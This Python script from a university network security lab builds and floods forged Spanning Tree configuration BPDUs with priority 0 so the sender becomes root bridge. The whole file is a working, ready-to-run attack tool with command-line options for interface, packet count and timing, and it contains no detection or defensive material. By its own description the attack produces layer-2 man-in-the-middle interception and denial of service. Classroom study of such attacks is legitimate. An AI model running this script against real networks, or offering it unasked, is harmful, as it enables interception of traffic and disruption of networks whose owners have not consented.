#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║       STP CLAIM ROOT BRIDGE ATTACK — Laboratorio ITLA           ║
║       Autor  : Raelina Ferrera                                   ║
║       Matrícula: 2021-2371                                       ║
║       Curso  : Seguridad en Redes                               ║
║       Fecha  : Febrero 2026                                      ║
╚══════════════════════════════════════════════════════════════════╝

DESCRIPCIÓN:
    Ataque al protocolo Spanning Tree (STP/RSTP) en el que el atacante
    envía BPDUs de configuración con prioridad 0 (la más baja posible),
    forzando una re-elección en la que el atacante se convierte en el
    Root Bridge de la topología.

    Consecuencias:
        - Tráfico de la red fluye a través del atacante (MITM L2).
        - Posible inestabilidad y bucles temporales durante la convergencia.
        - Denegación de servicio durante la re-convergencia STP.

USO:
    sudo python3 stp_root.py -i <interfaz> [opciones]
"""

import argparse
import sys
import signal
import time
import struct
from scapy.all import (
    Ether, LLC,
    sendp, conf, get_if_hwaddr, get_if_raw_hwaddr
)

# ─────────────────────────────────────────────
#  Banner
# ─────────────────────────────────────────────
BANNER = r"""
 ███████╗████████╗██████╗      ██████╗  ██████╗  ██████╗ ████████╗
 ██╔════╝╚══██╔══╝██╔══██╗     ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
 ███████╗   ██║   ██████╔╝     ██████╔╝██║   ██║██║   ██║   ██║
 ╚════██║   ██║   ██╔═══╝      ██╔══██╗██║   ██║██║   ██║   ██║
 ███████║   ██║   ██║          ██║  ██║╚██████╔╝╚██████╔╝   ██║
 ╚══════╝   ╚═╝   ╚═╝          ╚═╝  ╚═╝ ╚═════╝  ╚═════╝   ╚═╝

        [ STP CLAIM ROOT BRIDGE ] · Raelina Ferrera · 2021-2371 · ITLA
"""

# ─────────────────────────────────────────────
#  Colores
# ─────────────────────────────────────────────
class C:
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    CYAN    = "\033[96m"
    MAGENTA = "\033[95m"
    BOLD    = "\033[1m"
    RESET   = "\033[0m"

def log_info(msg):   print(f"{C.CYAN}[*]{C.RESET} {msg}")
def log_ok(msg):     print(f"{C.GREEN}[+]{C.RESET} {msg}")
def log_warn(msg):   print(f"{C.YELLOW}[!]{C.RESET} {msg}")
def log_bpdu(msg):   print(f"{C.MAGENTA}[BPDU]{C.RESET} {msg}")


# ─────────────────────────────────────────────
#  Construcción manual del BPDU de configuración
# ─────────────────────────────────────────────
# Scapy tiene STP integrado pero construirlo manualmente
# da control total y evita dependencias del contrib module.

STP_MULTICAST = "01:80:c2:00:00:00"

def mac_to_bytes(mac: str) -> bytes:
    """Convierte 'AA:BB:CC:DD:EE:FF' a bytes."""
    return bytes(int(b, 16) for b in mac.split(":"))


def build_config_bpdu(src_mac: str, root_priority: int,
                      bridge_priority: int, port_id: int,
                      hello_time: int, max_age: int,
                      forward_delay: int, message_age: int) -> bytes:
    """
    Construye un BPDU de configuración STP (IEEE 802.1D).

    Estructura del BPDU de configuración:
    - Protocol ID       : 2 bytes (0x0000 = STP)
    - Version           : 1 byte  (0x00 = STP, 0x02 = RSTP)
    - BPDU Type         : 1 byte  (0x00 = config)
    - Flags             : 1 byte
    - Root ID           : 8 bytes (2B priority + 6B MAC)
    - Root Path Cost    : 4 bytes
    - Bridge ID         : 8 bytes (2B priority + 6B MAC)
    - Port ID           : 2 bytes
    - Message Age       : 2 bytes (en 1/256 segundos)
    - Max Age           : 2 bytes
    - Hello Time        : 2 bytes
    - Forward Delay     : 2 bytes
    """
    src_bytes = mac_to_bytes(src_mac)

    # Root ID: prioridad baja (0) + MAC del atacante → se proclama root
    root_id = struct.pack("!H", root_priority) + src_bytes

    # Bridge ID: prioridad del atacante + MAC del atacante
    bridge_id = struct.pack("!H", bridge_priority) + src_bytes

    bpdu = (
        b"\x00\x00"                          # Protocol ID: IEEE 802.1D
        + b"\x00"                            # Version: STP (0x00) o RSTP (0x02)
        + b"\x00"                            # BPDU Type: configuration
        + b"\x00"                            # Flags: none
        + root_id                            # Root Bridge ID (8 bytes)
        + b"\x00\x00\x00\x00"               # Root Path Cost = 0
        + bridge_id                          # Bridge ID (8 bytes)
        + struct.pack("!H", port_id)        # Port ID
        + struct.pack("!H", message_age * 256)  # Message Age (1/256 s)
        + struct.pack("!H", max_age * 256)  # Max Age
        + struct.pack("!H", hello_time * 256)  # Hello Time
        + struct.pack("!H", forward_delay * 256)  # Forward Delay
    )
    return bpdu


def build_stp_frame(src_mac: str, bpdu_payload: bytes) -> bytes:
    """
    Encapsula el BPDU en una trama Ethernet con LLC (SAP=0x42).
    Destino: STP multicast 01:80:C2:00:00:00
    """
    pkt = (
        Ether(dst=STP_MULTICAST, src=src_mac)
        / LLC(dsap=0x42, ssap=0x42, ctrl=0x03)
    )
    # Añadir payload BPDU manualmente (Raw)
    from scapy.all import Raw
    pkt = pkt / Raw(load=bpdu_payload)
    return pkt


# ─────────────────────────────────────────────
#  Signal handler
# ─────────────────────────────────────────────
sent_count = 0

def signal_handler(sig, frame):
    print(f"\n{C.YELLOW}[!] Ataque STP detenido.{C.RESET}")
    print(f"{C.CYAN}[*] BPDUs enviados: {C.BOLD}{sent_count}{C.RESET}")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


# ─────────────────────────────────────────────
#  Bucle de ataque
# ─────────────────────────────────────────────
def attack(interface, root_priority, bridge_priority, hello_time,
           max_age, forward_delay, count, delay, verbose):
    global sent_count

    src_mac = get_if_hwaddr(interface)

    print(BANNER)
    log_info(f"Interfaz        : {C.BOLD}{interface}{C.RESET}")
    log_info(f"MAC del atacante : {C.BOLD}{src_mac}{C.RESET}")
    log_warn(f"Root Priority   : {C.BOLD}{root_priority}{C.RESET}  ← 0 = máxima prioridad")
    log_info(f"Bridge Priority : {C.BOLD}{bridge_priority}{C.RESET}")
    log_info(f"Hello Time      : {C.BOLD}{hello_time}s{C.RESET}")
    log_info(f"Max Age         : {C.BOLD}{max_age}s{C.RESET}")
    log_info(f"Forward Delay   : {C.BOLD}{forward_delay}s{C.RESET}")
    log_info(f"Paquetes        : {C.BOLD}{count if count else 'infinito'}{C.RESET}")
    print()
    log_warn("Enviando BPDUs con prioridad 0 — forzando elección de Root Bridge...")
    print()

    conf.verb  = 0
    port_id    = 0x8001   # Priority 128, Port 1
    target     = count if count else float("inf")
    start_time = time.time()

    bpdu_payload = build_config_bpdu(
        src_mac        = src_mac,
        root_priority  = root_priority,
        bridge_priority= bridge_priority,
        port_id        = port_id,
        hello_time     = hello_time,
        max_age        = max_age,
        forward_delay  = forward_delay,
        message_age    = 0,
    )
    frame = build_stp_frame(src_mac, bpdu_payload)

    while sent_count < target:
        sendp(frame, iface=interface, verbose=False)
        sent_count += 1

        if verbose:
            log_bpdu(f"[{sent_count:06d}] BPDU Config → {STP_MULTICAST} "
                     f"| Root Priority: {root_priority} | Bridge: {src_mac}")
        elif sent_count % 50 == 0:
            elapsed = time.time() - start_time
            rate    = sent_count / elapsed if elapsed > 0 else 0
            print(f"\r{C.GREEN}[+]{C.RESET} BPDUs enviados: {C.BOLD}{sent_count:,}{C.RESET}"
                  f"  | Rate: {rate:.1f} pkt/s  ", end="", flush=True)

        time.sleep(delay)

    print()
    elapsed = time.time() - start_time
    log_ok(f"Ataque finalizado — {sent_count:,} BPDUs en {elapsed:.1f}s")


# ─────────────────────────────────────────────
#  CLI
# ─────────────────────────────────────────────
def parse_args():
    p = argparse.ArgumentParser(
        description="STP Root Bridge Claim Attack — ITLA Lab 2021-2371",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Ejemplos:
  sudo python3 stp_root.py -i eth0
  sudo python3 stp_root.py -i eth0 --count 200 --delay 0.5
  sudo python3 stp_root.py -i eth0 -v --hello 1 --max-age 10
        """,
    )
    p.add_argument("-i",  "--interface",  required=True,
                   help="Interfaz de red del atacante (ej. eth0)")
    p.add_argument("--root-priority",     type=int, default=0,
                   help="Prioridad del Root Bridge falso (default: 0 = mínima posible)")
    p.add_argument("--bridge-priority",   type=int, default=0,
                   help="Prioridad del bridge atacante (default: 0)")
    p.add_argument("--hello",             type=int, default=2,
                   help="Hello Time en segundos (default: 2)")
    p.add_argument("--max-age",           type=int, default=20,
                   help="Max Age en segundos (default: 20)")
    p.add_argument("--fwd-delay",         type=int, default=15,
                   help="Forward Delay en segundos (default: 15)")
    p.add_argument("-c", "--count",       type=int, default=0,
                   help="Número de BPDUs a enviar (0 = infinito, default: 0)")
    p.add_argument("-d", "--delay",       type=float, default=2.0,
                   help="Delay entre BPDUs en segundos (default: 2.0 = simula hello real)")
    p.add_argument("-v", "--verbose",     action="store_true",
                   help="Mostrar cada BPDU enviado")
    return p.parse_args()


if __name__ == "__main__":
    args = parse_args()
    attack(
        interface       = args.interface,
        root_priority   = args.root_priority,
        bridge_priority = args.bridge_priority,
        hello_time      = args.hello,
        max_age         = args.max_age,
        forward_delay   = args.fwd_delay,
        count           = args.count,
        delay           = args.delay,
        verbose         = args.verbose,
    )